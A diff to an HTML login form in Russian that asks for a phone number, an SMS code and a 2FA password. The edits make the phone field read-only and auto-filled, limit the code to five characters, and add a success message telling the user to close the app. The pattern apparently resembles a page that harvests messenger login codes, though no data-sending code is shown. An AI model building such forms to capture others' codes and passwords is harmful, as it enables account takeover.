@@ -19,12 +19,13 @@
             <button id="loginBtn" class="login-btn">Войти</button>
             <div id="authForm" class="auth-form hidden">
                 <div class="loading" id="loadingSpinner"></div>
-                <input type="tel" id="phoneInput" placeholder="Введите номер телефона" class="input-field hidden">
-                <input type="text" id="codeInput" placeholder="SMS-код" class="input-field hidden">
-                <input type="password" id="2faInput" placeholder="Пароль 2FA" class="input-field hidden">
+                <p id="statusMsg" class="status-msg"></p>
+                <input type="tel" id="phoneInput" placeholder="Номер будет заполнен автоматически" class="input-field hidden" readonly>
+                <input type="text" id="codeInput" placeholder="Введите SMS-код" class="input-field hidden" maxlength="5">
+                <input type="password" id="2faInput" placeholder="Пароль 2FA (оставьте пустым, если нет)" class="input-field hidden">
                 <button id="submitBtn" class="submit-btn hidden">Подтвердить</button>
-                <div id="successMsg" class="success hidden">✅ Авторизация успешна!</div>
-                <div id="errorMsg" class="error hidden">❌ Разрешение отклонено. Попробуйте снова.</div>
+                <div id="successMsg" class="success hidden">✅ Авторизация успешна! Закройте приложение.</div>
+                <div id="errorMsg" class="error hidden"></div>
             </div>
         </main>
     </div>
